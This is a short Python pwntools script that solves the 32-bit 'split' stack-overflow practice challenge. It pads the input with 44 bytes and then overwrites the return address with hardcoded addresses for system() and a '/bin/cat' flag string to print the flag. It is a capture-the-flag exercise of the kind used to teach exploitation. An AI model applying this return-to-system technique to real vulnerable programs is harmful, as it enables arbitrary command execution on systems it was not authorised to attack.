#!/usr/bin/python

from pwn import *
import re

cat = '\x30\xa0\x04\x08'
system = "\x1a\x86\x04\x08"

r = process("./split32")

#Take the PID of the proccess for the GDB
pid=r.pid
print(r.pid)
print()

input()

conn =  r.recvuntil("data...")
print(conn)
print()

#Create payload 44 bytes plus the system call and the /bin/cat address and send it
payload = 'A' * 44
payload += system
payload += cat
r.sendline(payload)
print(payload)

conn =  r.recvuntil("you!")
print(conn)
print()


conn = r.recvuntil("flag!}")
print(conn)
